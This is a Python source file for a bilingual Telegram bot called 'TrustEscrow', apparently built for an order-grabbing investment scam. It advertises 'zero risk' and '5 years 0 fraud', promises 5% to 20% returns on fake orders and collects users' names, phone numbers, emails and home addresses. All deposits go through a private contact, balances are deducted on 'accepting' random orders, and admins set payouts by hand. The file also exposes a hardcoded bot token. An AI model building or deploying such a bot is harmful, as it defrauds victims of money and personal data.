# -*- coding: utf-8 -*-
import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
import random
from datetime import datetime

# ===================== 核心配置（已按你要求更新） =====================
BOT_TOKEN = "8747559514:AAE_N9M9CalIB4rYV0lbyny_0tGJnz3hLYU"
ADMIN_IDS = [8781082053, 8256055083]  # 双管理员ID
bot = telebot.TeleBot(BOT_TOKEN)

# ===================== 高端吸睛双语文案（重新设计） =====================
TEXT = {
    "zh": {
        "home": """🏆 TrustEscrow 頂級擔保平台
安全交易 · 穩定收益 · 零風險保障

✅ 5年零詐騙實績
✅ 專業中間人墊資
✅ 資金全程託管
✅ 搶單5%穩定收益
✅ 派單15%-20%高額回報
✅ 7×24小時客服支援

立即入駐，開啟你的穩定收益之路！
客服：@fcff88""",

        "reg_title": """📝 入駐擔保申請
（審核通過即可解鎖全部功能）

請依序填寫以下真實信息：
1. 真實姓名
2. 聯絡電話
3. 電子信箱
4. 居住地址
5. 推薦人ID

提交後將自動發送給管理員審核
審核時長：1-12小時""",

        "profile": """👤 個人中心
🆔 用戶ID：{}
💰 可用餘額：{:.2f} USDT
📌 審核狀態：{}

⏳ 未完成訂單
{}

✅ 已完成訂單
{}""",

        "grab": """🚀 搶單大廳
隨機高收益訂單 · 搶單即享5%利潤

可搶訂單：
{}
🔥 每日限量，先搶先得！""",

        "deposit": """💰 儲值 & 提現
所有業務僅透過官方客服處理
➡️ 官方客服：@fcff88

⚠️ 僅此唯一官方渠道，謹防詐騙！""",

        "record": """📜 擔保記錄
你的所有訂單明細，全程可查
{}""",

        "order_item": "• #{}｜{} USDT｜{}｜{}",
        "no_order": "• 暫無訂單",
        "status_wait": "待接單",
        "status_doing": "已接單",
        "status_done": "已完成",

        "reg_success": """✅ 入駐申請提交成功！
已發送給管理員審核，請耐心等待
審核通過後將解鎖全部功能""",

        "grab_success": "✅ 搶單成功！訂單已生成，等待管理員結算",
        "accept_success": "✅ 接單成功！已從餘額扣除對應金額",
        "not_enough": "❌ 餘額不足，無法接單",
        "not_verified": "❌ 未通過審核，暫無法使用此功能",

        "admin_assign": "✅ 派單成功！已發送給用戶",
        "admin_done": "✅ 訂單已完成！利潤已發放給用戶",
        "admin_verify": "✅ 用戶審核通過！已解鎖全部功能",
        "admin_reject": "❌ 用戶申請已拒絕",

        "lang": "🌐 English",
        "btn_reg": "入駐擔保",
        "btn_profile": "個人中心",
        "btn_grab": "搶單大廳",
        "btn_deposit": "儲值提現",
        "btn_record": "擔保記錄",
        "btn_accept": "立即接單",
        "btn_back": "返回首頁"
    },

    "en": {
        "home": """🏆 TrustEscrow Premium Escrow Platform
Safe Trading · Stable Profit · Zero Risk

✅ 5 Years 0 Fraud Record
✅ Professional Guarantor
✅ 100% Fund Escrow
✅ 5% Grab Order Profit
✅ 15%-20% Assign Order Return
✅ 24/7 Support

Join Now & Start Earning!
Support: @fcff88""",

        "reg_title": """📝 Escrow Registration
(Verify required to unlock all features)

Please fill in your real info:
1. Full Name
2. Phone Number
3. Email
4. Address
5. Referrer ID

Application will be sent to admins
Review time: 1-12 hours""",

        "profile": """👤 Profile
🆔 ID: {}
💰 Balance: {:.2f} USDT
📌 Status: {}

⏳ Pending Orders
{}

✅ Completed Orders
{}""",

        "grab": """🚀 Grab Order
Random High-Yield Orders · 5% Profit

Available Orders:
{}
🔥 Limited Daily, First Come First Served!""",

        "deposit": """💰 Deposit & Withdraw
All services via official support only
➡️ Support: @fcff88

⚠️ Only official channel, Beware of Scams!""",

        "record": """📜 Escrow Record
All your order details, fully traceable
{}""",

        "order_item": "• #{}｜{} USDT｜{}｜{}",
        "no_order": "• No orders yet",
        "status_wait": "Pending",
        "status_doing": "Accepted",
        "status_done": "Completed",

        "reg_success": """✅ Application Submitted!
Sent to admins for review
Full features unlocked after approval""",

        "grab_success": "✅ Order Grabbed! Waiting for admin settlement",
        "accept_success": "✅ Order Accepted! Amount deducted from balance",
        "not_enough": "❌ Insufficient USDT",
        "not_verified": "❌ Not Verified, Feature Unavailable",

        "admin_assign": "✅ Order Assigned! Sent to user",
        "admin_done": "✅ Order Completed! Profit sent to user",
        "admin_verify": "✅ User Verified! Full features unlocked",
        "admin_reject": "❌ Application Rejected",

        "lang": "🌐 繁中",
        "btn_reg": "Register",
        "btn_profile": "Profile",
        "btn_grab": "Grab",
        "btn_deposit": "Deposit",
        "btn_record": "Record",
        "btn_accept": "Accept",
        "btn_back": "Home"
    }
}

# ===================== 數據存儲 =====================
user_lang = {}
user_step = {}
user_balance = {}
user_verify = {}  # 0=未申請 1=審核中 2=已通過
user_info = {}
orders = {}
order_id = 1

# ===================== 菜單生成 =====================
def main_menu(user_id):
    lang = user_lang.get(user_id, "zh")
    t = TEXT[lang]
    m = InlineKeyboardMarkup(row_width=2)
    m.add(
        InlineKeyboardButton(t["btn_reg"], callback_data="reg"),
        InlineKeyboardButton(t["btn_profile"], callback_data="profile"),
        InlineKeyboardButton(t["btn_grab"], callback_data="grab"),
        InlineKeyboardButton(t["btn_deposit"], callback_data="deposit"),
        InlineKeyboardButton(t["btn_record"], callback_data="record"),
        InlineKeyboardButton(t["lang"], callback_data="lang"),
    )
    return m

def back_menu(user_id):
    lang = user_lang.get(user_id, "zh")
    t = TEXT[lang]
    m = InlineKeyboardMarkup()
    m.add(InlineKeyboardButton(t["btn_back"], callback_data="home"))
    return m

def accept_btn(user_id, oid):
    lang = user_lang.get(user_id, "zh")
    t = TEXT[lang]
    m = InlineKeyboardMarkup()
    m.add(InlineKeyboardButton(t["btn_accept"], callback_data=f"accept_{oid}"))
    m.add(InlineKeyboardButton(t["btn_back"], callback_data="profile"))
    return m

# ===================== 通知管理員 =====================
def notify_admins(text):
    for admin_id in ADMIN_IDS:
        try:
            bot.send_message(admin_id, text)
        except:
            pass

# ===================== /start 啟動 =====================
@bot.message_handler(commands=["start"])
def start(msg):
    u = msg.from_user.id
    user_lang.setdefault(u, "zh")
    user_step[u] = None
    user_balance.setdefault(u, 0.0)
    user_verify.setdefault(u, 0)
    t = TEXT[user_lang[u]]
    bot.send_message(u, t["home"], reply_markup=main_menu(u))

# ===================== 按鈕回調 =====================
@bot.callback_query_handler(func=lambda c: True)
def cb(c):
    u = c.from_user.id
    lang = user_lang.get(u, "zh")
    t = TEXT[lang]
    mid = c.message.message_id
    cid = c.message.chat.id

    try:
        if c.data == "home":
            bot.edit_message_text(t["home"], cid, mid, reply_markup=main_menu(u))

        elif c.data == "lang":
            user_lang[u] = "en" if lang == "zh" else "zh"
            t = TEXT[user_lang[u]]
            bot.edit_message_text(t["home"], cid, mid, reply_markup=main_menu(u))

        elif c.data == "reg":
            if user_verify.get(u, 0) == 0:
                user_step[u] = "reg_name"
                bot.edit_message_text(t["reg_title"], cid, mid, reply_markup=back_menu(u))
            else:
                bot.answer_callback_query(c.id, "❌ 已提交申請/已通過審核", show_alert=True)

        elif c.data == "profile":
            pending = []
            completed = []
            for oid, o in orders.items():
                if o["user"] == u:
                    s = t["status_done"] if o["status"] == 2 else t["status_doing"] if o["status"] == 1 else t["status_wait"]
                    line = t["order_item"].format(oid, o["amount"], "派單" if o["type"] == "assign" else "搶單", s)
                    if o["status"] == 2:
                        completed.append(line)
                    else:
                        pending.append(line)
            p_text = "\n".join(pending) if pending else t["no_order"]
            c_text = "\n".join(completed) if completed else t["no_order"]
            v_text = "審核中" if user_verify[u] == 1 else "已通過" if user_verify[u] == 2 else "未申請" if lang == "zh" else "Pending" if user_verify[u] == 1 else "Verified" if user_verify[u] == 2 else "Not Applied"
            text = t["profile"].format(u, user_balance.get(u, 0), v_text, p_text, c_text)
            bot.edit_message_text(text, cid, mid, reply_markup=back_menu(u))

        elif c.data == "grab":
            if user_verify.get(u, 0) != 2:
                bot.answer_callback_query(c.id, t["not_verified"], show_alert=True)
                return
            orders_list = []
            for i in range(3):
                amt = round(random.uniform(10, 50), 2)
                orders_list.append(f"• #{i+1}｜{amt} USDT")
            if random.random() < 0.15:
                big = round(random.uniform(50, 100), 2)
                orders_list.append(f"• #HOT｜{big} USDT 🔥")
            text = t["grab"].format("\n".join(orders_list))
            bot.edit_message_text(text, cid, mid, reply_markup=back_menu(u))
            global order_id
            oid = order_id
            order_id += 1
            amount = round(random.uniform(10, 50), 2)
            orders[oid] = {"user": u, "amount": amount, "type": "grab", "status": 0}
            bot.send_message(u, t["grab_success"], reply_markup=accept_btn(u, oid))

        elif c.data.startswith("accept_"):
            oid = int(c.data.split("_")[1])
            o = orders.get(oid)
            if not o or o["user"] != u or o["status"] != 0:
                bot.answer_callback_query(c.id, "❌ 訂單無效", show_alert=True)
                return
            if user_balance.get(u, 0) < o["amount"]:
                bot.answer_callback_query(c.id, t["not_enough"], show_alert=True)
                return
            user_balance[u] -= o["amount"]
            o["status"] = 1
            bot.edit_message_text(t["accept_success"], cid, mid, reply_markup=back_menu(u))

        elif c.data == "deposit":
            bot.edit_message_text(t["deposit"], cid, mid, reply_markup=back_menu(u))

        elif c.data == "record":
            lines = []
            for oid, o in orders.items():
                if o["user"] == u:
                    s = t["status_done"] if o["status"] == 2 else t["status_doing"] if o["status"] == 1 else t["status_wait"]
                    lines.append(t["order_item"].format(oid, o["amount"], "派單" if o["type"] == "assign" else "搶單", s))
            text = t["record"].format("\n".join(lines) if lines else t["no_order"])
            bot.edit_message_text(text, cid, mid, reply_markup=back_menu(u))

        bot.answer_callback_query(c.id)
    except Exception as e:
        print(f"Callback error: {e}")
        bot.answer_callback_query(c.id)

# ===================== 用戶消息處理（入駐流程） =====================
@bot.message_handler(func=lambda msg: msg.from_user.id not in ADMIN_IDS)
def user_msg(msg):
    u = msg.from_user.id
    cid = msg.chat.id
    txt = msg.text.strip()
    lang = user_lang.get(u, "zh")
    t = TEXT[lang]
    user_balance.setdefault(u, 0.0)
    user_verify.setdefault(u, 0)
    user_info.setdefault(u, {})

    if u not in user_step:
        user_step[u] = None

    # 入駐流程 - 姓名
    if user_step[u] == "reg_name":
        user_info[u]["name"] = txt
        user_step[u] = "reg_phone"
        bot.send_message(cid, "請輸入聯絡電話：" if lang == "zh" else "Enter phone number:", reply_markup=back_menu(u))

    # 入駐流程 - 電話
    elif user_step[u] == "reg_phone":
        user_info[u]["phone"] = txt
        user_step[u] = "reg_email"
        bot.send_message(cid, "請輸入電子信箱：" if lang == "zh" else "Enter email:", reply_markup=back_menu(u))

    # 入駐流程 - 郵箱
    elif user_step[u] == "reg_email":
        user_info[u]["email"] = txt
        user_step[u] = "reg_addr"
        bot.send_message(cid, "請輸入居住地址：" if lang == "zh" else "Enter address:", reply_markup=back_menu(u))

    # 入駐流程 - 地址
    elif user_step[u] == "reg_addr":
        user_info[u]["addr"] = txt
        user_step[u] = "reg_ref"
        bot.send_message(cid, "請輸入推薦人ID：" if lang == "zh" else "Enter referrer ID:", reply_markup=back_menu(u))

    # 入駐流程 - 推薦人
    elif user_step[u] == "reg_ref":
        user_info[u]["ref"] = txt
        user_verify[u] = 1
        user_step[u] = None
        bot.send_message(cid, t["reg_success"], reply_markup=main_menu(u))
        # 通知雙管理員
        notify_admins(f"""📥 新入駐申請
用戶ID：{u}
姓名：{user_info[u]['name']}
電話：{user_info[u]['phone']}
郵箱：{user_info[u]['email']}
地址：{user_info[u]['addr']}
推薦人：{user_info[u]['ref']}
請審核：發送「審核通過 {u}」或「審核拒絕 {u}」""")

# ===================== 管理員命令 =====================
@bot.message_handler(func=lambda msg: msg.from_user.id in ADMIN_IDS)
def admin_msg(msg):
    u = msg.from_user.id
    txt = msg.text.strip()
    parts = txt.split()
    t = TEXT["zh"]

    try:
        # 派單 用户ID 金额
        if parts[0] == "派单" and len(parts) == 3:
            target = int(parts[1])
            amt = float(parts[2])
            global order_id
            oid = order_id
            order_id += 1
            orders[oid] = {"user": target, "amount": amt, "type": "assign", "status": 0}
            bot.send_message(u, t["admin_assign"])
            bot.send_message(target, f"📥 你有新的派單 #{oid}｜{amt} USDT", reply_markup=accept_btn(target, oid))

        # 完成 订单号
        elif parts[0] == "完成" and len(parts) == 2:
            oid = int(parts[1])
            o = orders.get(oid)
            if not o:
                bot.send_message(u, "❌ 訂單不存在")
                return
            o["status"] = 2
            # 計算利潤
            if o["type"] == "assign":
                profit = o["amount"] * random.uniform(0.15, 0.20)
            else:
                profit = o["amount"] * 0.05
            user_balance[o["user"]] += o["amount"] + profit
            bot.send_message(u, t["admin_done"])
            bot.send_message(o["user"], f"✅ 訂單 #{oid} 已完成！\n本金：{o['amount']} USDT\n利潤：{round(profit, 2)} USDT\n總到賬：{round(o['amount'] + profit, 2)} USDT")

        # 審核通過 用户ID
        elif parts[0] == "审核通过" and len(parts) == 2:
            target = int(parts[1])
            user_verify[target] = 2
            bot.send_message(u, t["admin_verify"])
            bot.send_message(target, "✅ 你的入駐已通過審核！已解鎖全部功能", reply_markup=main_menu(target))

        # 審核拒絕 用户ID
        elif parts[0] == "审核拒绝" and len(parts) == 2:
            target = int(parts[1])
            user_verify[target] = 0
            user_step[target] = None
            bot.send_message(u, t["admin_reject"])
            bot.send_message(target, "❌ 你的入駐申請已被拒絕，請聯繫客服", reply_markup=main_menu(target))

        # 查詢 用户ID
        elif parts[0] == "查询" and len(parts) == 2:
            target = int(parts[1])
            info = user_info.get(target, {})
            balance = user_balance.get(target, 0)
            verify = user_verify.get(target, 0)
            v_text = "未申請" if verify == 0 else "審核中" if verify == 1 else "已通過"
            bot.send_message(u, f"""📊 用戶信息
ID：{target}
餘額：{balance:.2f} USDT
審核狀態：{v_text}
姓名：{info.get('name', '無')}
電話：{info.get('phone', '無')}
郵箱：{info.get('email', '無')}
地址：{info.get('addr', '無')}
推薦人：{info.get('ref', '無')}""")

    except Exception as e:
        bot.send_message(u, f"❌ 命令格式錯誤，請檢查輸入\n錯誤：{e}")

# ===================== 啟動機器人 =====================
if __name__ == "__main__":
    print("✅ TrustEscrow 豪華雙語版機器人啟動成功")
    print(f"✅ 管理員ID：{ADMIN_IDS}")
    bot.infinity_polling()
